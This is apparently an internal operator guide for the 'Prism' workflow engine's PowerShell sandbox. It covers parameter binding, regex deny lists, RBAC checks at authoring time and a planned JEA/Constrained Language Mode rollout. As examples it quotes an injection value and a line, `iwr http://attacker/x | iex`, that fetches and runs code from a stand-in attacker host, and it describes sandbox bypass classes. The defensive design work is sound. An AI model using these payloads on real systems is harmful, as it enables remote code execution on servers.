# Workflow PowerShell Sandbox — Operator Guide

**Last updated:** 2026-05-07 (Sprint 1, item S1-1)

## TL;DR

Prism's workflow engine ultimately runs PowerShell on managed servers via
WinRM. There are two distinct categories of risk and Prism handles them
differently:

| Block category | Examples | How user input reaches PowerShell | Defence |
|---|---|---|---|
| **Structured input** | `check_service`, `restart_service`, `start_service`, `stop_service`, `kill_process`, `check_disk`, `check_process` | Service name / process name / drive letter is **bound as a typed parameter** (`add_script(...).add_parameter(...)`). The script body itself is a fixed, developer-authored string. | PowerShell parameter binding. Attacker input cannot escape into the script body because it is never concatenated as text. |
| **Free-form script** | `run_powershell`, `condition` | The user authors the script body itself. | Regex allowlist sandbox in `ps_sandbox.py`. |
| **Static** | `clear_temp`, `restart_server` | No user input flows into the script. | None needed; the script is a literal. |

If you only ever use the structured blocks, the regex sandbox's known
weaknesses (see below) **do not apply** to your workflows.

## Where the boundary actually is (2026-08)

Read this before the sections below, because it changes what they are for.

**The regex sandbox is defence in depth. It is not the security boundary.** The
boundary is RBAC, and it is enforced at AUTHORING time: creating, updating or
cloning a workflow that contains a block reaching WinRM requires **admin
permission on every server those blocks name** — the same grant that running the
workflow by hand has always required.

It has to be checked at authoring, and the reason is the whole point. Running a
workflow by hand happens as a user, so a permission can be checked. A workflow
can also fire from a **schedule**, and the scheduler runs with no user present —
so there was nothing to check, and a login was enough to plant a free-form
script on a daily trigger. Update and clone are gated as well, because "create
it empty and fill it in" and "clone somebody else's blocks" are the two obvious
ways round a create-only gate.

What that means in practice:

* a user who can author a free-form script on a server **already holds admin on
  that server**, so defeating the regex gains them nothing they did not have;
* the regex still runs, and still refuses the obvious dangerous shapes, because
  a mistake is far more common than an attack;
* the honest full fix for the remaining surface is unchanged and is still
  Constrained Language Mode plus JEA on the targets — see below.

**Hardened in the same round**, and the shape is worth copying: the two
"compute the name of the thing you want to run" bypasses were not fixed by
listing more spellings of `Invoke-Expression`. They were fixed by denying
**dynamic invocation** itself — the call operator and dot-sourcing applied to
anything that is not a bare identifier — which is the one shape every such
bypass needs. Backtick-split identifiers were fixed by normalising the script
before matching, rather than by adding a rule per split point. The reflection
surface (`.GetType(`, `.Assembly`, `.Invoke(`, `[scriptblock]::Create`,
`[char]`) is denied, which closes the chains that started from an allowlisted
cmdlet and ended at arbitrary process spawn.

**One weakness is open on purpose.** Allowlisted read cmdlets (`Get-Content`,
`Get-ChildItem` and their aliases) accept arbitrary paths, so a free-form script
can read any file the service account can. A path allowlist would break the
diagnostic workflows those cmdlets exist for, and after the authoring gate the
only people who can write such a script are people with admin on that server —
who can read those files by other routes anyway. Accepted risk, with a reason.

---

## What changed in Sprint 1 (2026-05)

Prior to this sprint, the structured-input blocks built their PowerShell
script via Python f-string interpolation. A `service` field of
`Spooler'; Invoke-WebRequest http://attacker/x.ps1; '` became part of the
script body and ran as the WinRM service account. The regex sandbox was
not applied to those blocks; even if it had been, several known classes of
bypass would have rendered it ineffective (see below).

The fix: **eliminate string interpolation as the attack surface**. Each
structured block now does the equivalent of:

```python
script = """
param([string]$Name)
Restart-Service -Name $Name -Force
"""
ps.add_script(script).add_parameter("Name", service)
```

PowerShell's parameter binder does not re-parse bound values. The
`$Name` inside the script body is a typed `[string]` variable that the
binder fills with the literal value the caller supplied. Quotes,
backticks, `$()` subexpressions, and `;` separators inside the value have
no effect on the script's structure.

This change makes the sandbox-bypass classes documented in the audit
**irrelevant** for those blocks. Whatever the user types into `service`,
`process_name`, or `drive`, it cannot become PowerShell code.

---

## The free-form blocks: `run_powershell` and `condition`

These blocks let the workflow author write their own PowerShell. Some
workflows genuinely need it (diagnostic queries, custom validation). The
script is checked by `ps_sandbox.validate_script` before it is sent over
WinRM:

* DEFAULT-DENY: any cmdlet (Verb-Noun token) that is not on the allowlist
  rejects the script.
* HARD-DENY: a small list of patterns (`Invoke-Expression`, `iex`,
  `Add-Type`, `[Reflection.Assembly]`, network cmdlets, etc.) always
  rejects regardless of allowlist.
* Operators can extend the allowlist via `Settings → Workflows → Allowed
  cmdlets` for per-deployment needs.

### Known limitations

The sandbox is a regex tokeniser, not a PowerShell parser, so it is **not a
security boundary** against a determined, PowerShell-fluent insider — string
reconstruction, allowlisted file-read cmdlets on arbitrary paths, and .NET
reflection chains can all defeat a token-level allowlist. This is a documented,
risk-accepted limitation (F-053); closing it fully requires an AST-level parser
or a constrained runspace (see below).

Because of that, free-form PowerShell blocks are treated as privileged:
auth-gated, admin-only, and dual-control-approved on tier-0, while structured
workflow fields (service/process/port names, etc.) use parameter binding rather
than string interpolation. The sandbox stops casual misuse — an admin pasting
`iwr http://attacker/x | iex` into a workflow — not a determined operator.

### Operator guidance

* Treat any workflow that contains `run_powershell` or `condition` as
  privileged. Review the script body in code review the same way you
  review a runbook.
* The audit log records every workflow execution and the script text at
  execution time. Use that as your tamper-evident trail.
* Until JEA + CLM is rolled out (see below), require dual-control admin
  approval for new workflows that use these blocks.

---

## The proper long-term fix: JEA + Constrained Language Mode

The honest answer to the regex sandbox's weaknesses is to move the
boundary off the Python side entirely and onto the PowerShell side, on
each managed server. Two complementary mechanisms:

### Constrained Language Mode (CLM)

CLM is a per-runspace setting that disables the .NET reflection surface
PowerShell normally exposes. With CLM on:

* `[Reflection.Assembly]` casts fail.
* Method invocation on .NET types is restricted.
* `Add-Type` cannot compile arbitrary C#.
* `Invoke-Expression` still exists but cannot reach arbitrary types.

CLM neutralises bypass classes 1, 2, 3, and 5 above. It is set via:

```powershell
$ExecutionContext.SessionState.LanguageMode = 'ConstrainedLanguage'
```

…in the WinRM endpoint configuration's startup script, NOT in the
client-supplied script (where the user could just unset it).

### Just Enough Administration (JEA)

JEA is a Windows feature that lets you publish a constrained WinRM
endpoint backed by a role capability file (`*.psrc`) which lists exactly
which cmdlets, parameters, and parameter values are allowed. The endpoint
runs as a virtual account, isolated from the operator's own privileges.

A typical JEA role for Prism would expose something like:

```powershell
@{
    VisibleCmdlets = @(
        @{ Name = 'Get-Service'; Parameters = @{ Name = 'Name' } }
        @{ Name = 'Restart-Service'; Parameters = @{ Name = 'Name' }, @{ Name = 'Force' } }
        @{ Name = 'Get-Process'; Parameters = @{ Name = 'Name' } }
        @{ Name = 'Get-PSDrive'; Parameters = @{ Name = 'Name' } }
        # ...etc
    )
    LanguageMode = 'NoLanguage'  # even stricter than CLM
}
```

JEA + CLM together neutralise all five bypass classes plus arbitrary
file-read (because `Get-Content` either is not on the role's visible
cmdlet list, or its `Path` parameter is restricted by ValidateSet).

### Why this is not in Sprint 1

* Each of Prism's 30 managed servers needs the JEA endpoint registered
  (`Register-PSSessionConfiguration`), the role capability file deployed,
  and the WinRM listener restarted. That is per-server config work — not
  a Prism code change.
* The role capability file needs design: which cmdlets does each Prism
  feature actually need? Drift between Prism's pypsrp call sites and the
  JEA role's allowlist will silently break workflows.
* Test plan: at least one tier-0 server needs to run with the new
  endpoint for a full collector cycle before fleet rollout.

### Suggested rollout (Sprint 2 / Sprint 3)

1. **Author** a `Prism.Operations` JEA role file. Audit every cmdlet that
   Prism's Python code (`workflow_engine`, `runbook_engine`,
   `restart_scheduler`, `health_checker`, `collector`) calls; that is the
   exhaustive list of what the role needs to expose.
2. **Pilot** on a non-tier-0 server. Re-run the full Prism test suite
   with `WinRMConfigurationName=Prism.Operations` configured on the
   target. Catch every "cmdlet not visible in JEA endpoint" error.
3. **Add** an `endpoint_name` field per `ServerConfig` so operators can
   roll the JEA endpoint forward fleet-wide one server at a time.
4. **Document** the migration runbook: how to install the role file, how
   to register the endpoint, how to roll back.
5. **Cut over** tier-0 last, with at least one full week of dual-running
   on the pilot box.

The work is straightforward but not Prism-internal — it is a Windows
operations rollout. Allowing it to slip past Sprint 2 is acceptable;
allowing it to slip past Sprint 3 means we are leaning on the regex
sandbox for longer than is safe.

---

## Summary

* Structured blocks (the majority) are now safe by construction —
  parameter binding is the boundary, not a regex.
* Free-form blocks (`run_powershell`, `condition`) lean on a regex
  sandbox with **documented** weaknesses. Treat them as privileged.
* JEA + CLM is the correct long-term fix. It is per-server config work,
  scheduled for Sprint 2/3.
